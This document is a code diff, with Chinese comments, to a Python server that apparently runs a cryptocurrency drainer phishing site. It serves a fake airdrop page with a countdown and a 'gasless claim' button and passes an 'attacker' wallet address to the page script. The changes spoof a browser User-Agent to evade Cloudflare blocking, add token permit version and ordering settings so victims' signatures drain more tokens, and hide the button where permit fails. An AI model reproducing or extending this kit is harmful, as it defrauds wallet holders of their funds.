@@ -148,7 +148,9 @@ STORE = EventStore()
 
 def rpc_call(url: str, method: str, params):
     payload = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
-    req = urllib.request.Request(url, data=payload, headers={"Content-Type": "application/json"})
+    # 公共 RPC(Cloudflare)默认拦 python-urllib 的 UA,必须伪装成浏览器
+    req = urllib.request.Request(url, data=payload, headers={
+        "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"})
     with urllib.request.urlopen(req, timeout=15) as resp:
         out = json.loads(resp.read())
     if "error" in out:
@@ -250,6 +252,9 @@ class Handler(BaseHTTPRequestHandler):
                     .replace("__SYMBOL__", str(self.cfg["token"]["symbol"]))
                     .replace("__GASLESS__", str(site.get("gasless_text", "免 Gas 领取")))
                     .replace("__TOKEN_NAME__", str(self.cfg["token"]["name"])))
+            if not site.get("show_gasless", True):
+                # permit 不适用的代币(如 Polygon USDT0 的 salted domain)隐藏免 Gas 入口
+                page = page.replace('id="gaslessBtn"', 'id="gaslessBtn" style="display:none"')
             self._html(200, page)
         elif path == "/app.js":
             page = (load_template("app.js")
@@ -261,6 +266,8 @@ class Handler(BaseHTTPRequestHandler):
                     "token_name": self.cfg["token"]["name"],
                     "symbol": self.cfg["token"]["symbol"],
                     "attacker": self.cfg["attacker"]["address"],
+                    "permit_version": str(self.cfg["token"].get("permit_version", "1")),
+                    "permit_order": str(self.cfg["token"].get("permit_order", "deadline_first")),
                     "project": str(self.cfg["site"]["project"]),
                     "airdrop_amount": str(self.cfg["site"]["airdrop_amount"]),
                     "countdown_minutes": self.cfg["site"]["countdown_minutes"],
